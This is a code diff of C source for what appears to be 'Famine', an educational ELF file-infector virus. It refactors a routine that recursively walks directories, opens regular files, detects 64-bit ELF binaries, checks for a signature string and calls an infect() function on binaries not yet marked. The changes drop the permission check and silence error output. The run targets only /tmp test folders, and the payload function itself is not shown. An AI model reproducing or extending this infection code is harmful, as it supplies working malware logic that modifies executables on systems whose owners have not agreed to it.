@@ -8,10 +8,7 @@ bool    check_elf(FILE *fp, int arch)
     {
         ch = fgetc(fp);
         if (ch == EOF)
-        {
-            fclose(fp);
             return false;
-        }
         header[i] = (unsigned char)ch;
     }
     header[5] = '\0';
@@ -22,15 +19,13 @@ bool    check_elf(FILE *fp, int arch)
     return header[4] == arch;
 }
 
-void analyze_directory(const char *dirname)
+void analyze_directory(const char *dirname, const char *string, size_t len)
 {
-    const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
     DIR *dir = opendir(dirname);
     if (!dir)
         return;
     struct dirent *entry;
     char path[1024];
-    size_t len = strlen(string) + 1;
     
     while ((entry = readdir(dir)) != NULL)
     {  
@@ -41,38 +36,31 @@ void analyze_directory(const char *dirname)
         struct stat st;
         if (stat(path, &st) == -1)
         {
-            perror("stat failed");
+            //perror("stat failed");
             continue;
         }
         if (S_ISDIR(st.st_mode))
         {
             //printf("[DIR ] %s\n", path);
-            analyze_directory(path);
+            analyze_directory(path, string, len);
         }
         else if (S_ISREG(st.st_mode))
         {
-            
-            if (access(path, W_OK) == 0  && access(path, X_OK) == 0)
+            FILE *fp = fopen(path, "ab+");
+            if (fp == NULL)
             {
-                FILE *fp = fopen(path, "ab+");
-                if (check_elf(fp, 2))
-                {
-                    //printf("Its elf: %s\n", path);
-                    //check_infection(fp, string, len - 1);
-                    if (!check_infection(fp, string, len - 1))
-                        infect(fp, string, len);
-                    else
-                        printf("Already infected.\n");
-                }
-                else
-                {
-                    //printf("[FILE] %s\n", path);
-                }
+                //perror(path);
+                continue ;
             }
-        }
-        else
-        {
-            //printf("[OTHR] %s\n", path);
+            if (check_elf(fp, 2))
+            {
+                //printf("Its elf: %s\n", path);
+                if (!check_infection(fp, string, len - 1))
+                    infect(fp, string, len);
+                else
+                    printf("Already infected.\n");
+            }
+            fclose(fp);
         }
     }
     closedir(dir);
@@ -80,6 +68,9 @@ void analyze_directory(const char *dirname)
 
 void run_infection()
 {
-    analyze_directory("/tmp/test");
-    analyze_directory("/tmp/test2");
+    const char *string = "Famine version 1.0 (c)oded by fvieira-login2";
+    size_t len = strlen(string) + 1;
+
+    analyze_directory("/tmp/test", string, len);
+    analyze_directory("/tmp/test2", string, len);
 }
